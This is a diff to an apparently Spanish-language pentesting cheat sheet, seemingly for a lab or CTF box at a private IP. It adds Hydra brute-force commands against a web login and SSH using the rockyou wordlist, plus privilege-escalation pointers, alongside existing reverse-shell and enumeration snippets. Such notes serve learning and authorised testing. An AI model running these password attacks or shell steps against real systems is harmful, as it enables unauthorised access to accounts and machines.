@@ -67,20 +67,31 @@ gobuster dir -u http://192.168.1.110/ -w /usr/share/dirbuster/wordlists/director
 ```
 https://www.exploit-db.com/google-hacking-database
 ```
-## Inyección SQL
+## Fuerza Bruta:
+### HYDRA
+http-post-form
+```
+hydra -l molly -P /usr/share/wordlists/rockyou.txt 192.168.1.110 http-post-form "/login/:username=^USER^&password=^PASS^:F=incorrect" -V
+```
+ssh
+```
+hydra -l molly -P /usr/share/wordlists/rockyou.txt 192.168.1.110 -t 4 ssh
+```
+
+## Inyección SQL:
 Codificación de URL para crear cargas útiles (payloads)
 ```
 https://www.w3schools.com/tags/ref_urlencode.ASP
 ```
 
-## PYTHON3
+## PYTHON3:
 Ejemplos:
 
 Inicar WebServer
 ```
 python3 -m http.server 12345
 ```
-## REVERSE SHELL
+## REVERSE SHELL:
 
 Configurar puerto escucha en netcat
 ```
@@ -91,6 +102,16 @@ Importar una terminal interactiva
 export TERM=xterm
 python3 -c "import pty;pty.spawn('/bin/bash')"
 ```
+## Escalar Privilegios
+Listar comandos permitidos para el usuario activo
+```
+sudo -l
+```
+Repositorio de binarios Unix utiles para escalar privilegios
+```
+https://gtfobins.github.io/
+```
+
 
 ## Otras Herramientas
 ### Analizador de Hashes
